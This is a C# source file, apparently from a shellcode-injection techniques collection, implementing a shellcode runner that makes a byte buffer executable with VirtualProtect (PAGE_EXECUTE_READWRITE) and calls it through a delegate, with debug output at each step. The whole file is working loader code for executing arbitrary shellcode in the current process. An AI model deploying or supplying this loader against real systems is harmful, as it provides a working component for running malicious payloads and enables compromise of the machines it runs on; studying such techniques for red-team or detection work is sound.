using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;

namespace ShellcodeInjectionTechniques
{
    class ShellcodeRunner : ITechnique
    {
        private delegate void ShellcodeDelegate();

        public void Run(Process target, byte[] shellcode)
        {
            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    // set the memory where the shellcode is to PAGE_EXECUTE_READWRITE
                    IntPtr memoryAddress = (IntPtr)ptr;
                    VirtualProtect(memoryAddress, (UIntPtr)shellcode.Length, MemoryProtection.PAGE_EXECUTE_READWRITE, out MemoryProtection lpfOldProtect);
                    Debug("[+] VirtualProtect() - set to PAGE_EXECUTE_READWRITE, shellcode address: 0x{0}", new string[] { memoryAddress.ToString("X") });

                    // execute the shellcode using a delegate function
                    Debug("[+] Executing shellcode - memory address: 0x{0}", new string[] { memoryAddress.ToString("X") });
                    ShellcodeDelegate func = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(ShellcodeDelegate));
                    func();
                }
            }
        }
    }
}
